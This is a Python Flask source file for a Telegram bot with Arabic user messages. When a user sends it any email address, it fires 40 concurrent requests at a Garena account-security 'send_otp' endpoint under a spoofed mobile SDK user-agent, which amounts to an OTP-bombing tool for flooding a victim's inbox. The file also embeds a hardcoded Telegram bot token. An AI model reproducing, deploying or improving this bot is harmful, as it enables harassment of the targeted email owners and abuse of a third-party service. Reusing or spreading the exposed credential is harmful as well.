import requests
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify

app = Flask(__name__)

BOT_TOKEN = "8658580899:AAGklJayHDFNGVlSRmRr6oC8J6i_YwLRcKA"
GARENA_URL = "https://100067.connect.garena.com/game/account_security/swap:send_otp"

headers = {
    'User-Agent': "GarenaMSDK/4.0.41(SM-A065F ;Android 15;ar;MA;app 1.123.1 2019120270;)",
    'Connection': "Keep-Alive",
    'Accept': "application/json",
    'Accept-Encoding': "gzip"
}

def send_request(email, req_id):
    try:
        payload = {'app_id': "100067", 'email': email, 'locale': "ar_MA"}
        response = requests.post(GARENA_URL, data=payload, headers=headers, timeout=10)
        return f"[{req_id}] {response.status_code} - {response.text[:200]}"
    except Exception as e:
        return f"[{req_id}] خطأ: {str(e)}"

def send_40_requests(email):
    results = []
    with ThreadPoolExecutor(max_workers=40) as executor:
        futures = [executor.submit(send_request, email, i) for i in range(1, 41)]
        results = [f.result() for f in futures]
    return "\n".join(results)

def send_telegram(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        for i in range(0, len(text), 4000):
            requests.post(url, json={"chat_id": chat_id, "text": text[i:i+4000]}, timeout=5)
    except:
        pass

@app.route("/", methods=["GET"])
def home():
    return "Bot is running", 200

@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
def webhook():
    try:
        update = request.get_json()
        if not update or "message" not in update:
            return jsonify({"status": "ok"}), 200
        
        chat_id = update["message"].get("chat", {}).get("id")
        text = update["message"].get("text", "").strip()
        
        if not chat_id:
            return jsonify({"status": "ok"}), 200
        
        if "@" in text and "." in text:
            send_telegram(chat_id, f"⏳ جاري ارسال 40 طلب الى {text}...")
            result = send_40_requests(text)
            send_telegram(chat_id, f"✅ النتائج:\n\n{result}")
        elif text == "/start":
            send_telegram(chat_id, "📧 ارسل الايميل لارسال 40 طلب")
        else:
            send_telegram(chat_id, "❌ ارسل ايميل صحيح مثال: test@gmail.com")
        
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"status": "error"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
